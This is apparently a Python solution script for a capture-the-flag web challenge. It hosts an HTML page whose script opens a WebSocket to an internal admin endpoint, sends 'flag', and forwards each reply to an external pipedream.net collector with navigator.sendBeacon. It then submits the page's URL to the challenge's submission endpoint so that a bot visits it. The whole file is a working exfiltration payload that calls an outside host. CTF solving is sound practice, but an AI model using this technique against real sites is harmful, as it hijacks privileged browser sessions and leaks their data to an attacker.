import sys
sys.path.append('../')

from WebUtils.HTTPSync import *
from WebUtils.HTTPHost import http_host

src_html = """
<body>
<script>
    let ws = new WebSocket('ws://web:8080/admin/ws');
    ws.onopen = () => {
        ws.send('flag');
    };
    ws.onmessage = (d) => {
        console.log(d);
        navigator.sendBeacon('https://enbit6i3l2ra4.x.pipedream.net/', d.data);
    }
</script>
</body>
"""

# host payload
url = http_host(src_html)
print(url)

res = post("http://chall.polygl0ts.ch:9010/submit", data={
    'url': url
})

print(res.text)


